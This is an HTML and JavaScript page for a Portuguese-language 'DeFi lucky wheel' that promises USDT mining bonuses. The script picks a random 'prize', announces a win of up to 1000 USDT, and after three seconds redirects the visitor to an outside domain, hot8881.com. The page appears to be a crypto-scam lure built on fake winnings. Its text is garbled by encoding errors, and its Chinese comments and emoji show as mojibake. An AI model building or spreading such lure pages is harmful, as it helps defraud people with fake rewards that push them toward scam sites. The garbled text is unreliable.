<body>

  <h1>ğŸ‰ Roda da Sorte DeFi</h1>
  <p class="subtitle">Gire e ganhe bÃ´nus exclusivos de mineraÃ§Ã£o USDT!</p>

  <div class="wheel-container">
    <canvas id="wheelcanvas" width="420" height="420"></canvas>
    <div id="pointer"></div>
  </div>

  <button id="spinbtn">GIRAR ğŸ</button>
  <div id="result"></div>

<script>
  const prizes = [
    "5 USDT",
    "10 USDT",
    "30 USDT",
    "ExperiÃªncia 3 dias",
    "100 USDT",
    "Obrigado",
    "MineraÃ§Ã£o 7 dias",
    "1000 USDT"
  ];
  const colors = [
    "#f44336", "#e91e63", "#9c27b0", "#2196f3",
    "#4caf50", "#ff9800", "#00bcd4", "#8bc34a"
  ];

  const canvas = document.getElementById("wheelcanvas");
  const ctx = canvas.getContext("2d");
  const centerX = canvas.width / 2;
  const centerY = canvas.height / 2;
  const radius = 190;
  const segmentCount = prizes.length;
  const segmentAngle = (2 * Math.PI) / segmentCount;

  let currentAngle = 0;
  let isSpinning = false;

  // ç”»è½¬ç›˜
  function drawWheel(angle) {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.save();
    ctx.translate(centerX, centerY);
    ctx.rotate(angle);
    for(let i = 0; i < segmentCount; i++){
      // ç”»æ‰‡å½¢
      ctx.beginPath();
      ctx.fillStyle = colors[i];
      ctx.moveTo(0, 0);
      ctx.arc(0, 0, radius, i*segmentAngle, (i+1)*segmentAngle);
      ctx.closePath();
      ctx.fill();

      // å†™æ–‡å­—
      ctx.save();
      // æ—‹è½¬åˆ°æ‰‡å½¢ä¸­å¿ƒ
      ctx.rotate(i*segmentAngle + segmentAngle/2);
      ctx.fillStyle = "#fff";
      ctx.font = "bold 16px Rubik";
      ctx.textAlign = "center";
      ctx.textBaseline = "middle";

      // æ–‡å­—æ¢è¡Œå¤„ç†ï¼Œè‹¥éœ€è¦å¯ä»¥æ¢æˆæ›´å¤æ‚çš„ç»˜åˆ¶
      const text = prizes[i];
      const maxWidth = radius * 0.6;

      // ç®€å•æ–­è¡Œï¼ˆæŒ‰ç©ºæ ¼åˆ†ï¼‰
      let lines = [];
      if(text.length > 10){
        lines = text.split(" ");
      } else {
        lines = [text];
      }
      const lineHeight = 18;
      for(let j=0; j<lines.length; j++){
        ctx.fillText(lines[j], radius * 0.55, (j - (lines.length-1)/2) * lineHeight);
      }
      ctx.restore();
    }
    ctx.restore();
  }

  // ç¼“åŠ¨å‡½æ•°
  function easeOut(t) {
    return t*(2 - t);
  }

  // æ—‹è½¬å‡½æ•°
  function spin(){
    if(isSpinning) return;
    isSpinning = true;
    document.getElementById("result").textContent = "";

    const spins = Math.floor(Math.random()*4) + 5;  // 5~8åœˆ
    const chosenIndex = Math.floor(Math.random()*segmentCount);

    // æœ€ç»ˆè§’åº¦ï¼Œè½¬ç›˜æ—‹è½¬æ–¹å‘æ˜¯é¡ºæ—¶é’ˆï¼Œæ‰€ä»¥è§’åº¦è¦åå‘
    const finalAngle = (2*Math.PI)*spins - (chosenIndex*segmentAngle + segmentAngle/2);

    let start = null;
    function animate(timestamp){
      if(!start) start = timestamp;
      const elapsed = timestamp - start;
      const duration = 4500;
      if(elapsed < duration){
        const progress = elapsed/duration;
        currentAngle = easeOut(progress)*finalAngle;
        drawWheel(currentAngle);
        requestAnimationFrame(animate);
      } else {
        currentAngle = finalAngle;
        drawWheel(currentAngle);
        // æ˜¾ç¤ºç»“æœ
        const prize = prizes[chosenIndex];
        document.getElementById("result").textContent = `ğŸŠ VocÃª ganhou: ${prize}`;
        // 3ç§’åè·³è½¬
        setTimeout(()=>{
          window.location.href = "http://hot8881.com";
        },3000);
        isSpinning = false;
      }
    }
    requestAnimationFrame(animate);
  }

  // åˆå§‹åŒ–ç”»è½¬ç›˜
  drawWheel(0);

  // ç»‘å®šæŒ‰é’®äº‹ä»¶
  document.getElementById("spinbtn").addEventListener("click", spin);
</script>
